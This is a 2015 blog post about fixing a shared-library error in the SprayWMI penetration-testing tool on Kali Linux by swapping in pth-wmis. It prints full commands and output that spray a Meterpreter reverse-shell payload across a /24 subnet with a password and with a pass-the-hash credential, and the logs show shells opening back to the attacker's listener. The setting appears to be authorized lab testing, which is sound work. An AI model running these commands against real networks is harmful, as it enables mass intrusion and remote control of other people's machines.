---
layout: post
title: Fixing wmis in SprayWMI
date: '2015-12-13T16:48:00.002-07:00'
author: Sanjiv Kawa
tags:
- SprayWMI
- Kali
- wmis
- WMI
- libgnutls.so.26
comments: true
---

I ran into an error with SprayWMI where wmis could not execute due issues with the system architecture, even though I am running an i386 version of Kali 2.

{% highlight css %}
root@kali:~/tools/spraywmi# ./spraywmi.py

[!] Unicorn not detected, checking out for you automatically.
Cloning into 'unicorn'...
remote: Counting objects: 104, done.
remote: Total 104 (delta 0), reused 0 (delta 0), pack-reused 104
Receiving objects: 100% (104/104), 44.89 KiB | 0 bytes/s, done.
Resolving deltas: 100% (60/60), done.
Checking connectivity... done.
[!] Looks like you have an issue with wmis - this is most likely because you are on a 64 bit platform and need a couple things first..
[!] If on Ubuntu run command to fix: dpkg --add-architecture i386 && apt-get update && apt-get install libpam0g:i386 libpopt0:i386
root@kali:~/tools/spraywmi# ./wmis
./wmis: error while loading shared libraries: libgnutls.so.26: cannot open shared object file: No such file or directory
{% endhighlight %}

I decided to try and locate libraries that contain libgnutls.

{% highlight css %}
root@kali:~/tools/spraywmi# apt-cache search libgnutls
libgnutls-deb0-28 - GNU TLS library - main runtime library
libgnutls-openssl27 - GNU TLS library - OpenSSL wrapper
libgnutls28-dbg - GNU TLS library - debugger symbols
libgnutls28-dev - GNU TLS library - development files
libgnutlsxx28 - GNU TLS library - C++ runtime library
python-gnutls - Python wrapper for the GNUTLS library
root@kali:~/tools/spraywmi#
{% endhighlight %}

Installing these libraries did not fix the issue. So I decided to find pth-wmis on my system and use this file instead of the wmis file provided with SprayWMI. The wmis file included with the SprayWMI package is used for invoking wmi queries. Therefore it should be the same as pth-wmis.

{% highlight css %}
root@kali:~/tools/spraywmi# updatedb
root@kali:~/tools/spraywmi# locate wmis
/root/tools/spraywmi/wmis
/usr/bin/pth-wmis
root@kali:~/tools/spraywmi# mv wmis wmis.orig
root@kali:~/tools/spraywmi# cp /usr/bin/pth-wmis ./wmis
root@kali:~/tools/spraywmi# ./spraywmi.py
{% endhighlight %}

This got past the initial error of wmis being unable to locate libgnutls.

{% highlight css %}
  __   __   __                       
/__` |__) |__)  /\  \ / |  |  |\/| |
.__/ |    |  \ /~~\  |  |/\|  |  | |


         Written by: David Kennedy @ TrustedSec


SprayWMI is a method for mass spraying Unicorn PowerShell injection to CIDR notations.

Flags and descriptions:

domain                 Domain you are attacking. If its local, just specify workgroup.
username               Username to authenticate on the remote Windows system.
password               Password or password hash LM:NTLM to use on the remote Windows system.
CIDR range or file     Specify a single IP, CIDR range (10.0.1.1/24) or multiple CIDRs: 10.0.1.1/24,10.0.2.1/24.
                          You can also specify a file (ex: ips.txt) that contains a single IP addresses on each line.
payload                Metasploit payload, example: windows/meterpreter/reverse_tcp
LHOST                  Reverse shell IP address.
LPORT                  Reverse shell listening port.
optional: NO           Specify no if you do not want to create a listener. This is useful if you already have a listener
                          established. If you do not specify a value, it will automatically create a listener for you.      
{% endhighlight %}

Testing SprayWMI with the recently replaced wmis file proved to be the solution for my issue. One thing to note is that you will need to escape certain characters otherwise SprayWMI will hang at `[*] Be patient, Metasploit takes a little bit to start.`

{% highlight css %}
root@kali:~/tools/spraywmi# python spraywmi.py popped spock XXXXXXXX\!X 192.168.1.0/24 windows/meterpreter/reverse_https 192.168.1.193 443

[*] Launching SprayWMI on the hosts specified.
[*] Generating shellcode through Unicorn, this could take a few seconds.
[*] Launching the listener in the background.
[*] Waiting for the listener to start first before we continue.
[*] Be patient, Metasploit takes a little bit to start.
[*] Sweeping targets for open TCP port 135 first, then moving through. Be patient.
[*] Launching WMI spray against IP: 192.168.1.86 - You should have a shell in the background. Once finished, a shell will spawn.
[*] Spraying is still happening in the background, shells should arrive as they complete.
[*] Interacting with Metasploit.
 as background job.

[*] Started HTTPS reverse handler on https://0.0.0.0:443/
[*] Starting the payload handler...
msf exploit(handler) > [*] 192.168.1.86:49223 (UUID: 269d2a51d09e214e/x86=1/windows=1/2015-12-13T23:18:44Z) Staging Native payload ...
[*] Encoded stage with x86/shikata_ga_nai
[*] Meterpreter session 1 opened (192.168.1.193:443 -> 192.168.1.86:49223) at 2015-12-13 16:18:50 -0700
{% endhighlight %}

Tested with a hash to confirm that SprayWMI is able to use wmis in its intended way.

{% highlight css %}
root@kali:~/tools/spraywmi# python spraywmi.py popped spock aad3b435b51404eeaad3b435b51404ee:6XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX5 192.168.1.0/24 windows/meterpreter/reverse_https 192.168.1.193 443

[*] Launching SprayWMI on the hosts specified.
[*] Generating shellcode through Unicorn, this could take a few seconds.
[*] Launching the listener in the background.
[*] Waiting for the listener to start first before we continue.
[*] Be patient, Metasploit takes a little bit to start.
[*] Sweeping targets for open TCP port 135 first, then moving through. Be patient.
[*] Launching WMI spray against IP: 192.168.1.86 - You should have a shell in the background. Once finished, a shell will spawn.
[*] Spraying is still happening in the background, shells should arrive as they complete.
[*] Interacting with Metasploit.
 as background job.

[*] Started HTTPS reverse handler on https://0.0.0.0:443/
[*] Starting the payload handler...
msf exploit(handler) > [*] 192.168.1.86:58170 (UUID: a11ee6c27b6cc418/x86=1/windows=1/2015-12-13T23:20:52Z) Staging Native payload ...
[*] Encoded stage with x86/shikata_ga_nai
[*] Meterpreter session 1 opened (192.168.1.193:443 -> 192.168.1.86:58170) at 2015-12-13 16:20:58 -0700
{% endhighlight %}
